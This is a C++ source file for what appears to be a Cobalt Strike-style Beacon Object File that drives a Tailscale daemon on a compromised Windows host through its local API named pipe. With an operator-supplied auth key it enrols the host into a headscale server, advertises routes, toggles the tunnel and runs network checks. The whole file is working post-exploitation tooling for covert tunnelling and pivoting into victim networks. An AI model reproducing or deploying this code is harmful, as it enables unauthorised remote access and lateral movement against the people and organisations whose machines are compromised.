#include "beacon.h"
#include <stdexcept>
#include <string_view>
#include <ranges>
#include <optional>
#include <utils.h>
#include <jsoncons/json.hpp>
#include <winternl.h>
#include "netcheck.hpp"

using namespace jsoncons;
using namespace netcheck;

const char RequestTemplate[] = R"(%s /localapi/v0/%s HTTP/1.0
Connection: close
Host: local-tailscaled.sock
Tailscale-Cap: 125
User-Agent: Tailscale
Content-Type: application/json
Content-Length: %d

)";

struct HttpStatusLine {
    std::string version;
    int statusCode;
    std::string reasonPhrase;
};

enum HttpStatus {
    Ok = 200,
    NoContent = 204
};


HANDLE OpenPipe(const std::string &path) {
	return CreateFile(path.c_str(), GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION, nullptr);
}

// Helper to read exactly N bytes from pipe
bool ReadExact(HANDLE pipe, void* buffer, DWORD bytesToRead) {
    BYTE* ptr = static_cast<BYTE*>(buffer);
    while (bytesToRead > 0) {
        DWORD chunk = 0;
        if (!ReadFile(pipe, ptr, bytesToRead, &chunk, nullptr)) {
            return false; // error
        }
        if (chunk == 0) break; // EOF
        ptr += chunk;
        bytesToRead -= chunk;
    }
    return true;
}

// Read headers into a string
std::string ReadHeaders(HANDLE pipe) {
    std::string headers;
    char c;
    std::string line;
    int consecutiveCRLF = 0;

    while (true) {
        DWORD read = 0;
        if (!ReadFile(pipe, &c, 1, &read, nullptr) || read == 0) {
            break;
        }
        headers.push_back(c);

        // Track CRLF sequence
        if (c == '\n') {
            consecutiveCRLF++;
            if (consecutiveCRLF >= 2) break; // empty line = end of headers
        }
        else if (c != '\r') {
            consecutiveCRLF = 0;
        }
    }
    return headers;
}

// Extract Content-Length if present
size_t ParseContentLength(const std::string& headers) {
    std::istringstream ss(headers);
    std::string line;
    while (std::getline(ss, line)) {
        if (line.find("Content-Length:") != std::string::npos) {
            size_t pos = line.find(":");
            if (pos != std::string::npos) {
                return std::stoul(line.substr(pos + 1));
            }
        }
    }
    return 0;
}


HttpStatusLine ParseStatusLine(const std::string& headers) {
    HttpStatusLine result;
    std::istringstream iss(headers);

    iss >> result.version >> result.statusCode;
    std::getline(iss, result.reasonPhrase);

    // Trim leading space from reasonPhrase
    if (!result.reasonPhrase.empty() && result.reasonPhrase[0] == ' ')
        result.reasonPhrase.erase(0, 1);

    return result;
}


json ReadFully(HANDLE pipe, HttpStatusLine& statusLine) {

    std::string headers = ReadHeaders(pipe);
    size_t contentLength = ParseContentLength(headers);
    statusLine = ParseStatusLine(headers);

    std::string body;

    if (contentLength > 0) {
        body.resize(contentLength);
        if (!ReadExact(pipe, body.data(), (DWORD)contentLength)) {
            throw std::runtime_error("Failed to read full HTTP body with Content-Length");
        }
    }
    else {
        // No Content-Length: read until pipe closes
        char buffer[4096];
        DWORD bytesRead = 0;
        while (ReadFile(pipe, buffer, sizeof(buffer), &bytesRead, nullptr) && bytesRead > 0) {
            body.append(buffer, bytesRead);
        }
    }

    if (!body.empty())
        return json::parse(body);
    else
        return json::null();
}


json SendCommand(const std::string& pipe, const std::string_view& method, const std::string_view& path, const json& body, int expectedStatusCode) {

	auto written = 0ul;
	auto hPipe = OpenPipe(pipe);
	auto err = GetLastError();
    auto body_data = body.to_string();
    auto contentLength = body.empty() ? 0 : body_data.size();
    HttpStatusLine status;
    char buffer[1024];

	if (hPipe == INVALID_HANDLE_VALUE) {
		throw std::runtime_error("Failed to connect to tailscale IPR pipe, is tailscaled async BOF running and using the same pipe?");
	}
	scoped_exit close([hPipe] {
		CloseHandle(hPipe);
	});

	auto size = sprintf_s(buffer, sizeof(buffer), RequestTemplate, method.data(), path.data(), contentLength);

	if (!WriteFile(hPipe, buffer, size, &written, nullptr)) {
		throw std::runtime_error("Failed to write headers to pipe");
	}

    if (contentLength > 0) {
        if (!WriteFile(hPipe, body_data.c_str(), body_data.size(), &written, nullptr)) {
            throw std::runtime_error("Failed to write body to pipe");
        }
    }

	auto result = ReadFully(hPipe, status);

    if(status.statusCode != expectedStatusCode)
        throw std::runtime_error("Unexpected HTTP status code");

    return result;
}

static void PrintNode(const json& node, bool self) {

    std::string status_line = "";

    if (!self) {
        if (node["Online"].as_bool()) {
            if (!node["Active"].as_bool()) {
                status_line = "idle";
            }
            else {
                status_line = "active";
            }

            auto curAddress = node["CurAddr"].as_string();
            auto relay = node["Relay"].as_string();
            
            if (!relay.empty() && curAddress.empty()) {
                status_line += ", relay " + relay;
            }
            else {
                status_line += ", direct " + curAddress;
            }      
        }
        else {
            status_line += "offline";
        }
    }
    else {
        status_line = "-";
    } 

    BeaconPrintf(CALLBACK_OUTPUT, "%-15s %-40s %-20s\n", node["TailscaleIPs"].array_range().begin()->as_cstring(), node["DNSName"].as_string_view().data(), status_line.c_str());
}

static json GetStatus(const std::string& pipe) {
    return SendCommand(pipe, "GET", "status", json(), HttpStatus::Ok);

}

static json SetRunningState(const std::string& pipe, bool state) {

    json maskedPrefs = json::object();
    json prefs = json::object();

    prefs["WantRunning"] = state;
    maskedPrefs["Prefs"] = prefs;
    maskedPrefs["WantRunningSet"] = true;

    return SendCommand(pipe, "PATCH", "prefs", maskedPrefs, HttpStatus::Ok);
}

std::map<std::string, std::string> GetBeaconArgs(datap* data) {

    std::map<std::string, std::string> args;
    std::string token;
    char* ptr;

    while ( (ptr = BeaconDataExtract(data, nullptr)) != nullptr) {
        token = std::string(ptr);
        if (token.rfind("--", 0) != 0) {
            if(!args.contains("command"))
                args["command"] = token;
            else
                BeaconPrintf(CALLBACK_OUTPUT, "Warning: multiple command found within argument array, igoring: %s\n", token.c_str());
            
            continue;
        }

        token = token.substr(2); 

        std::string key, value;
        size_t eq = token.find('=');

        if (eq != std::string::npos) {
            key = token.substr(0, eq);
            value = token.substr(eq + 1);
        }
        else {
            key = token;
            ptr = BeaconDataExtract(data, nullptr);
            std::string next = ptr ? std::string(ptr) : "";
            if (!next.empty() && next.rfind("--", 0) != 0) {
                value = next;
            }
            else {
                value = "true";
                if (!next.empty())
                    BeaconPrintf(CALLBACK_OUTPUT, "Warning: unexpected token after flag: %s\n", next.c_str());
            }
        }

        args[key] = value;
    }

    return args;
}

jsoncons::json SplitToJsonArray(std::string_view s, char delimiter) {
    json j = json::array(); 

    for (auto part : s | std::views::split(delimiter)) {
        j.push_back(std::string(&*part.begin(), std::ranges::distance(part)));
    }

    return j;
}

std::pair<std::optional<asio::ip::address_v4>, std::optional<asio::ip::address_v6>>
PerformDnsLookup(asio::io_context& io, const std::string& hostname) {
    asio::ip::tcp::resolver resolver(io);

    std::optional<asio::ip::address_v4> ipv4_addr;
    std::optional<asio::ip::address_v6> ipv6_addr;

    try {
        // This returns both IPv4 and IPv6 addresses
        asio::ip::tcp::resolver::results_type results =
            resolver.resolve(hostname, "");

        for (const auto& entry : results) {
            const auto& addr = entry.endpoint().address();

            if (addr.is_v4() && !ipv4_addr.has_value()) {
                ipv4_addr = addr.to_v4();
            }
            else if (addr.is_v6() && !ipv6_addr.has_value()) {
                ipv6_addr = addr.to_v6();
            }

            // Stop early if we have both
            if (ipv4_addr.has_value() && ipv6_addr.has_value()) {
                break;
            }
        }
    }
    catch (const std::system_error& e) {
        std::cerr << "DNS lookup failed: " << e.what() << std::endl;
    }

    return { ipv4_addr, ipv6_addr };
}


// Create example DERP map with actual Tailscale servers
std::shared_ptr<DERPMap> CreateDERPMap(asio::io_context& io, const std::string& endpoint) {
    auto dm = std::make_shared<DERPMap>();

    // Helper to add a region
    auto add_region = [&dm](int id, const std::string& code, const std::string& name,
        const std::string& hostname, const std::string& ipv4,
        const std::string& ipv6 = "") {
            auto region = std::make_shared<DERPRegion>();
            region->region_id = id;
            region->region_code = code;
            region->region_name = name;

            auto node = std::make_shared<DERPNode>();
            node->name = std::to_string(id);
            node->region_id = id;
            node->host_name = hostname;
            node->ipv4 = ipv4;
            node->ipv6 = ipv6;
            node->stun_port = 3478;
            region->nodes.push_back(node);

            dm->regions[id] = region;
        };

    if (!endpoint.empty()) {
        auto [ipv4, ipv6] = PerformDnsLookup(io, endpoint);
        std::string ipv4_str;
        std::string ipv6_str;

        if (ipv4) {
            ipv4_str = ipv4.value().to_string();
        }

        if (ipv6) {
            ipv6_str = ipv6.value().to_string();
        }
        
        add_region(999, "nc", "Netcheck Test", endpoint, ipv4_str, ipv6_str);
    }
    else {
        //TODO: fetch derp map from backend
    }

    return dm;
}

std::string FormatTimestamp() {
    auto now = std::chrono::system_clock::now();
    auto time_t = std::chrono::system_clock::to_time_t(now);
    auto ms = std::chrono::duration_cast<std::chrono::microseconds>(
        now.time_since_epoch()) % 1000000;

    std::tm tm;
#ifdef _WIN32
    gmtime_s(&tm, &time_t);
#else
    gmtime_r(&time_t, &tm);
#endif

    std::ostringstream oss;
    oss << std::put_time(&tm, "%Y-%m-%dT%H:%M:%S");
    oss << '.' << std::setfill('0') << std::setw(6) << ms.count() << 'Z';
    return oss.str();
}

// Helper to format IPv4 endpoint
std::string FormatIPv4(const asio::ip::udp::endpoint& ep) {
    if (ep.address().is_unspecified() || ep.port() == 0) {
        return "no";
    }
    std::ostringstream oss;
    oss << ep.address().to_string() << ":" << ep.port();
    return oss.str();
}

// Helper to format latency in milliseconds
std::string FormatLatency(duration d) {
    auto ms = std::chrono::duration_cast<std::chrono::duration<double, std::milli>>(d);
    std::ostringstream oss;

    // Format like Tailscale: show decimal if < 100ms, otherwise round
    if (ms.count() < 100) {
        oss << std::fixed << std::setprecision(1) << ms.count() << "ms";
    }
    else {
        oss << std::fixed << std::setprecision(0) << ms.count() << "ms";
    }

    return oss.str();
}


void PrintReport(const Report& report, const DERPMap& dm) {

    BeaconPrintf(CALLBACK_OUTPUT, "Report:\n");
    BeaconPrintf(CALLBACK_OUTPUT, "\t* Time: %s\n", FormatTimestamp().c_str());
    BeaconPrintf(CALLBACK_OUTPUT, "\t* UDP: %s\n", report.udp ? "true" : "false");

    // IPv4
    BeaconPrintf(CALLBACK_OUTPUT, "\t* IPv4: ");
    if (report.ipv4 && report.global_v4.port() != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "yes, %s\n", FormatIPv4(report.global_v4).c_str());
    }
    else if (report.ipv4_can_send) {
        BeaconPrintf(CALLBACK_OUTPUT, "yes, but no global address detected\n");
    }
    else {
        BeaconPrintf(CALLBACK_OUTPUT, "no\n");
    }

    // IPv6
    BeaconPrintf(CALLBACK_OUTPUT, "\t* IPv6: ");
    if (report.ipv6 && report.global_v6.port() != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "yes, %s\n", report.global_v6.address().to_string().c_str());
    }
    else if (report.os_has_ipv6) {
        BeaconPrintf(CALLBACK_OUTPUT, "no, but OS has support\n");
    }
    else {
        BeaconPrintf(CALLBACK_OUTPUT, "no\n");
    }

    // MappingVariesByDestIP
    BeaconPrintf(CALLBACK_OUTPUT, "\t* MappingVariesByDestIP: ");
    if (report.mapping_varies_by_dest_ip.has_value()) {
        BeaconPrintf(CALLBACK_OUTPUT, "%s\n", report.mapping_varies_by_dest_ip.value() ? "true" : "false");
    }
    else {
        BeaconPrintf(CALLBACK_OUTPUT, "(unknown)\n");
    }

    // PortMapping (placeholder)
    BeaconPrintf(CALLBACK_OUTPUT, "\t* PortMapping: \n");

    // Nearest DERP
    BeaconPrintf(CALLBACK_OUTPUT, "\t* Nearest DERP: ");
    if (report.preferred_derp > 0) {
        auto it = dm.regions.find(report.preferred_derp);
        if (it != dm.regions.end()) {
            BeaconPrintf(CALLBACK_OUTPUT, "%s\n", it->second->region_name.c_str());
        }
        else {
            BeaconPrintf(CALLBACK_OUTPUT, "%d\n", report.preferred_derp);
        }
    }
    else {
        BeaconPrintf(CALLBACK_OUTPUT, "(none)\n");
    }

    // DERP latency - sort by latency
    BeaconPrintf(CALLBACK_OUTPUT, "\t* DERP latency:\n");

    std::vector<std::pair<int, duration>> latencies;
    for (const auto& [region_id, latency] : report.region_latency) {
        latencies.push_back({ region_id, latency });
    }

    // Sort by latency
    std::sort(latencies.begin(), latencies.end(),
        [](const auto& a, const auto& b) { return a.second < b.second; });

    // Print sorted latencies
    for (const auto& [region_id, latency] : latencies) {
        auto it = dm.regions.find(region_id);
        if (it != dm.regions.end()) {
            const auto& region = it->second;
            BeaconPrintf(CALLBACK_OUTPUT, "\t\t- %-4s %-7s (%s)\n",
                region->region_code.c_str(),
                FormatLatency(latency).c_str(),
                region->region_name.c_str());
        }
    }

    // Show regions with no latency
    for (const auto& [region_id, region] : dm.regions) {
        if (report.region_latency.find(region_id) == report.region_latency.end()) {
            BeaconPrintf(CALLBACK_OUTPUT, "\t\t- %-4s          (%s)\n",
                region->region_code.c_str(),
                region->region_name.c_str());
        }
    }
}

void NetCheck(const std::string& endpoint) {

    asio::io_context io;
    netcheck::GetReportOpts opts;
    auto client = std::make_shared<netcheck::Client>(io);
    auto derp_map = CreateDERPMap(io, endpoint);

    if (!derp_map)
        return;
   
    client->GetReport(derp_map, opts, [&io, derp_map](auto report, auto ec) {
        if (ec) {
            std::cerr << "Error: " << ec.message() << "\n";
        }
        else if (report) {
            PrintReport(*report, *derp_map);
        }
        io.stop();
        });

    io.run();

}

extern "C" __declspec(dllexport) void go(const char* data, int len) {

	try {

		datap args;
		json body;
        json status;

        if (data == nullptr || len == 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "No arguments provided\n");
            return;
        }

		BeaconDataParse(&args, (char*)data, len);
        auto parsedArgs = GetBeaconArgs(&args);        
        const auto& command = parsedArgs["command"];
        auto pipe = std::string();

        if (parsedArgs.contains("socket") || command == "netcheck")
            pipe = parsedArgs["socket"];
        else {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] No socket provided, bailing\n");
            return;
        }
        
		auto size = 0ul;        
		auto path = std::string();

        if (!pipe.empty()) {
            status = GetStatus(pipe.c_str());
            BeaconPrintf(CALLBACK_OUTPUT, "[=] Fetched latest status\n");
        }       
		
		if (command == "status") {
			            
            if (!status.empty()) {
                if (parsedArgs.contains("json")) {
                    std::ostringstream oss;
                    oss << jsoncons::pretty_print(status);
                    BeaconPrintf(CALLBACK_OUTPUT, "%s", oss.str().c_str());
                }
                else {
                    auto state = status["BackendState"].as_string_view();

                    BeaconPrintf(CALLBACK_OUTPUT, "%s\n", state.data());
                    for (const auto& line : status["Health"].array_range()) {
                        BeaconPrintf(CALLBACK_OUTPUT, "  %s\n", line.as_cstring());
                    }

                    if (state == "Running") {
                        PrintNode(status["Self"], true);
                        if (status.contains("Peer") && status["Peer"] != json::null()) {
                            for (const auto& peer : status["Peer"].object_range()) {
                                PrintNode(peer.value(), false);
                            }
                        }
                    }
                }
            }
            else {
                BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to get status from backed\n");
            }
		}
		else if (command == "up") {
  
            json prefs = json::object();
            prefs["RouteAll"] = false;
            prefs["ExitNodeID"] = "";
            prefs["ExitNodeIP"] = "";
            prefs["InternalExitNodePrior"] = "";
            prefs["ExitNodeAllowLANAccess"] = false;
            prefs["CorpDNS"] = false;
            prefs["RunSSH"] = false;
            prefs["RunWebClient"] = false;
            prefs["WantRunning"] = true;
            prefs["LoggedOut"] = false;
            prefs["ShieldsUp"] = false;
            prefs["AdvertiseTags"] = null_type(); 
            prefs["Hostname"] = "";
            prefs["NotepadURLs"] = false;
            prefs["ForceDaemon"] = true;
            prefs["AdvertiseRoutes"] = null_type();
            prefs["AdvertiseServices"] = null_type();
            prefs["NoSNAT"] = false;
            prefs["NoStatefulFiltering"] = true;
            prefs["NetfilterMode"] = 2;
            prefs["PostureChecking"] = false;
            prefs["NetfilterKind"] = "";
            prefs["DriveShares"] = null_type();
            prefs["AllowSingleHosts"] = true;
            prefs["Config"] = null_type();

            json start = json::object();            
            start["FrontendLogID"] = "";
            start["UpdatePrefs"] = prefs;
             
            if (!status.contains("HaveNodeKey") || !status["HaveNodeKey"].as_bool()) {

                if (!parsedArgs.contains("auth-key")) {
                    BeaconPrintf(CALLBACK_OUTPUT, "No auth-key provided\n");
                    return;
                }
                start["AuthKey"] = parsedArgs["auth-key"];

                if (!parsedArgs.contains("login-server")) {
                    BeaconPrintf(CALLBACK_OUTPUT, "No headscale login-server provided\n");
                    return;
                }
                prefs["ControlURL"] = parsedArgs["login-server"];
                start["UpdatePrefs"] = prefs;

                SendCommand(pipe, "POST", "check-prefs", prefs, HttpStatus::Ok);
                SendCommand(pipe, "POST", "start", start, HttpStatus::NoContent);
                SendCommand(pipe, "POST", "login-interactive", json(), HttpStatus::NoContent);
            }
            else {
                SetRunningState(pipe, true);
            }

        }
        else if (command == "down") {
            SetRunningState(pipe, false);

        }else if(command == "netcheck"){
            NetCheck(parsedArgs["endpoint"]);

        }else if (command == "set") {

            json prefs = json::object();

            for (auto& opt : parsedArgs) {

                if (opt.first == "command" || opt.first == "socket")
                    continue;

                if (opt.first == "advertise-routes") {
                    prefs["AdvertiseRoutesSet"] = true;
                    prefs["AdvertiseRoutes"] = SplitToJsonArray(opt.second, ',');
                }   
                else {
                    BeaconPrintf(CALLBACK_OUTPUT, "[!] Unsupported argument %s\n", opt.first.c_str());
                    return;
                }
            }
               
            SendCommand(pipe, "POST", "check-prefs", prefs, HttpStatus::Ok);
            SendCommand(pipe, "PATCH", "prefs", prefs, HttpStatus::Ok); 

        }else if (command == "shutdown") {
            SendCommand(pipe, "POST", "shutdown", json(), HttpStatus::Ok);
        }
        else {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] Unsupported command %s\n", command.c_str());
        }
	}
	catch (const std::exception& e) {
		BeaconPrintf(CALLBACK_OUTPUT, "[!] Error: %s\n", e.what());	
	}
}

BEACON_MAIN("zzzzzzzzzzz", go)
